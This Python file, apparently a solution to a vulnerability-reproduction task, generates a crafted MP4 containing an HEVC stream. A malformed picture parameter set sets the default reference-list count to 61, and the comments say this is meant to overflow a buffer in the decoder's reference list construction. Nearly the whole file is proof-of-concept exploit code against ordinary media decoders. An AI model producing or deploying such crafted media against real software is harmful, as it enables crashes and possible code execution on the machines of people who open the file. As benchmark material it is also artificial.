import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitStream:
            def __init__(self):
                self.bits = ""
            def write(self, val, width):
                self.bits += f"{val:0{width}b}"
            def write_ue(self, val):
                if val == 0:
                    self.bits += "1"
                    return
                tmp = val + 1
                length = tmp.bit_length() - 1
                self.bits += "0" * length
                self.bits += f"{tmp:b}"
            def write_se(self, val):
                if val <= 0: v = -2 * val
                else: v = 2 * val - 1
                self.write_ue(v)
            def get_bytes(self):
                if len(self.bits) % 8 != 0:
                    self.bits += "1" + "0" * (7 - (len(self.bits) % 8))
                return bytes(int(self.bits[i:i+8], 2) for i in range(0, len(self.bits), 8))

        def box(t, d): return struct.pack(">I", len(d)+8) + t + d
        def fbox(t, v, f, d): return box(t, struct.pack(">B", v) + struct.pack(">I", f)[1:] + d)

        # Minimal valid VPS and SPS
        vps = bytes.fromhex("40010c01ffff01600000030000030000030000030073")
        sps = bytes.fromhex("420101016000000300000300000300000300a0030080041d965d53")

        # Malformed PPS to trigger buffer overflow in default ref list construction
        bs_pps = BitStream()
        bs_pps.write_ue(0) # pps_pic_parameter_set_id
        bs_pps.write_ue(0) # pps_seq_parameter_set_id
        bs_pps.write(0, 7) # dependent_slice... to cabac_init_present
        bs_pps.write_ue(60) # num_ref_idx_l0_default_active_minus1 (Over 15 -> Overflow in RefPicList0)
        bs_pps.write_ue(0) # num_ref_idx_l1_default_active_minus1
        bs_pps.write_se(0) # init_qp_minus26
        bs_pps.write(0, 3) # constrained_intra, transform_skip, cu_qp_delta
        bs_pps.write_se(0) # pps_cb_qp_offset
        bs_pps_rbsp_cr = 0
        bs_pps.write_se(0) # pps_cr_qp_offset
        # Flags: slice_chroma, weighted, weighted_bi, transquant, tiles, entropy, loop_filter, deblocking, scaling, lists_mod
        bs_pps.write(0, 10) 
        bs_pps.write_ue(0) # log2_parallel_merge_level_minus2
        bs_pps.write(0, 2) # slice_segment_header_ext, pps_ext
        bs_pps.write(1, 1) # rbsp_trailing_bits
        
        pps = b'\x44\x01' + bs_pps.get_bytes()

        # Slice NALU referencing the malformed PPS
        bs_slice = BitStream()
        bs_slice.write(1, 1) # first_slice_segment_in_pic_flag
        bs_slice.write(1, 1) # slice_pic_parameter_set_id (ue(v) 0 -> 1)
        bs_slice.write_ue(0) # slice_type (B-slice)
        bs_slice.write(0, 1) # num_ref_idx_active_override_flag (0 -> force use of PPS default)
        bs_slice.write(1, 1) # mvd_l1_zero_flag
        bs_slice.write_se(0) # slice_qp_delta
        bs_slice.write(1, 1) # trailing
        
        nalu_slice = b'\x02\x01' + bs_slice.get_bytes()
        sample = struct.pack(">I", len(nalu_slice)) + nalu_slice

        # Build MP4
        ftyp = box(b'ftyp', b'isom\x00\x00\x02\x00isomiso2avc1mp41')
        
        # hvcC: Version 1, Profile 1, Level 0...
        hvcc_head = b'\x01\x01\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f'
        # Arrays: VPS, SPS, PPS
        arrays = (b'\xa0\x00\x01' + struct.pack(">H", len(vps)) + vps +
                  b'\xa1\x00\x01' + struct.pack(">H", len(sps)) + sps +
                  b'\xa2\x00\x01' + struct.pack(">H", len(pps)) + pps)
        hvcc = hvcc_head + b'\x03' + arrays
        
        stsd = fbox(b'stsd', 0, 0, box(b'hvc1', b'\x00'*6 + b'\x00\x01' + b'\x00'*16 + struct.pack(">HH", 32, 32) + b'\x00\x48\x00\x00'*2 + b'\x00'*4 + struct.pack(">H", 1) + b'\x00'*32 + struct.pack(">H", 24) + b'\xff\xff' + box(b'hvcC', hvcc)))
        stts = fbox(b'stts', 0, 0, struct.pack(">II", 1, 1) + struct.pack(">II", 1, 100))
        stsc = fbox(b'stsc', 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
        stsz = fbox(b'stsz', 0, 0, struct.pack(">I", 0) + struct.pack(">I", 1) + struct.pack(">I", len(sample)))
        # stco placeholder
        stco = fbox(b'stco', 0, 0, struct.pack(">II", 1, 0)) 
        
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', fbox(b'vmhd', 0, 1, b'\x00'*8) + box(b'dinf', fbox(b'dref', 0, 0, struct.pack(">I", 1) + fbox(b'url ', 0, 1, b''))) + stbl)
        mdia = box(b'mdia', fbox(b'mdhd', 0, 0, b'\x00'*16) + fbox(b'hdlr', 0, 0, b'\x00'*8 + b'vide' + b'\x00'*12) + minf)
        tkhd = fbox(b'tkhd', 0, 7, b'\x00'*8 + struct.pack(">I", 1) + b'\x00'*20 + b'\x01\x00\x00\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' + struct.pack(">II", 32<<16, 32<<16))
        
        mvhd = fbox(b'mvhd', 0, 0, b'\x00'*8 + struct.pack(">I", 1000) + b'\x00'*4 + b'\x00\x01\x00\x00\x01\x00' + b'\x00'*10 + b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">I", 2))
        
        # Calculate moov size and offset
        trak = box(b'trak', tkhd + mdia)
        moov_temp = box(b'moov', mvhd + trak)
        offset = len(ftyp) + len(moov_temp) + 8 # +8 for mdat header
        
        # Rebuild stco and moov
        stco = fbox(b'stco', 0, 0, struct.pack(">II", 1, offset))
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', fbox(b'vmhd', 0, 1, b'\x00'*8) + box(b'dinf', fbox(b'dref', 0, 0, struct.pack(">I", 1) + fbox(b'url ', 0, 1, b''))) + stbl)
        mdia = box(b'mdia', fbox(b'mdhd', 0, 0, b'\x00'*16) + fbox(b'hdlr', 0, 0, b'\x00'*8 + b'vide' + b'\x00'*12) + minf)
        trak = box(b'trak', tkhd + mdia)
        moov = box(b'moov', mvhd + trak)
        
        mdat = box(b'mdat', sample)
        
        return ftyp + moov + mdat